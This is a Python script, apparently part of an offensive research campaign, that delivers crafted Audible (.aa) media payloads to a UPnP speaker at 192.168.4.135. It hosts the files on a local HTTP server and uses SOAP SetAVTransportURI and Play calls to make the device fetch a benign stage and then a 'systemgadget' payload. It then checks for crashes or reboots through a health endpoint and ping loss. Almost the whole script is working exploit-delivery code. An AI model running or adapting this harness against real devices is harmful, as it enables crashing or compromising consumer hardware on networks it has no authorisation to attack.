#!/usr/bin/env python3
"""Fire the S2 FN-matrix payloads on .135 (192.168.4.135, 86.10-81100).
Protocol per campaign doctrine: benign .aa (stage1 transport bind) -> FN .aa -> observe.
Health oracle: :1400/status/VERSION. Reboot oracle: VERSION gap >= 45s or ICMP loss."""
import http.server, socketserver, threading, subprocess, time, sys, urllib.request, os

IP="192.168.4.135"; HOST=os.environ.get("HOST_IP","192.168.4.160"); PORT=8971
SVC="urn:schemas-upnp-org:service:AVTransport:1"
CTL=f"http://{IP}:1400/MediaRenderer/AVTransport/Control"

def soap(action, extra=""):
    body=('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
          's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
          f'<u:{action} xmlns:u="{SVC}"><InstanceID>0</InstanceID>{extra}</u:{action}>'
          '</s:Body></s:Envelope>')
    r=subprocess.run(["curl","-s","-m","25","-X","POST","-H",'Content-Type: text/xml; charset="utf-8"',
                      "-H",f"SOAPACTION: \"{SVC}#{action}\"","--data-binary",body,
                      "-w","\n%{http_code}",CTL],capture_output=True,text=True)
    out=r.stdout.rsplit("\n",1)
    return out[-1] if len(out)>1 else "??", out[0][:120]

def meta(url, proto):
    return ('<DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/" '
            'xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/">'
            '<item id="-1" parentID="-1" restricted="true"><dc:title>poc</dc:title>'
            '<upnp:class>object.item.audioItem.musicTrack</upnp:class>'
            f'<res protocolInfo="{proto}">{url}</res></item></DIDL-Lite>')

def setav(path, proto="http-get:*:audio/aac:*"):
    url=f"http://{HOST}:{PORT}/{path}"
    esc=meta(url,proto).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    return soap("SetAVTransportURI", f"<CurrentURI>{url}</CurrentURI><CurrentURIMetaData>{esc}</CurrentURIMetaData>")

def alive(timeout=4):
    r=subprocess.run(["curl","-s","-m",str(timeout),"-o","/dev/null","-w","%{http_code}",
                      f"http://{IP}:1400/status/VERSION"],capture_output=True,text=True)
    return r.stdout.strip()

def ping_loss(timeout=3):
    r=subprocess.run(["ping","-c","1","-W","1000",IP],capture_output=True,text=True)
    return "1 packets received" not in r.stdout and "1 received" not in r.stdout

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        name=self.path.split("?")[0].lstrip("/")
        p=f"recon/tnzm_audible/sweep2/{name}"
        if not os.path.exists(p):
            self.send_error(404); return
        data=open(p,"rb").read()
        self.send_response(200)
        self.send_header("Content-Type","audio/audible")
        self.send_header("Content-Length",str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        print(f"  [srv] served {name} ({len(data)}B)")
    def log_message(self,*a): pass

def serve():
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer((HOST,PORT),H) as s:
        s.serve_forever()

def watch(t0, secs):
    events=[]
    last=alive()
    while time.time()-t0<secs:
        time.sleep(2)
        a=alive()
        if a=="000":
            events.append((round(time.time()-t0,1),"http-down"))
        ping=ping_loss()
        if ping:
            events.append((round(time.time()-t0,1),"icmp-loss"))
        if events and events[-1][1] in ("http-down","icmp-loss"):
            continue
    return events

def main():
    pay=sys.argv[1] if len(sys.argv)>1 else "S2FN_systemgadget_710000.aa"
    benign=sys.argv[2] if len(sys.argv)>2 else "H_valid_min.aa"
    t=threading.Thread(target=serve,daemon=True); t.start()
    print(f"health pre: {alive()}")
    c1,_=soap("Stop")
    print(f"stage1 benign {benign}: SetAV={c1}")
    c1,j1=setav(benign); print(f"  -> {c1} {j1[:80]}")
    time.sleep(2)
    c2,rr=soap("Play","<Speed>1</Speed>"); print(f"  play: {c2}")
    time.sleep(3)
    print(f"stage2 payload {pay}: SetAV ...")
    c2,j2=setav(pay); print(f"  -> {c2} {j2[:80]}")
    c2p,_=soap("Play","<Speed>1</Speed>"); print(f"  play: {c2p}")
    t0=time.time()
    ev=watch(t0, 150)
    print("events:", ev if ev else "none (clean)")
    print(f"health post: {alive()} after {round(time.time()-t0,1)}s")

if __name__=="__main__":
    main()
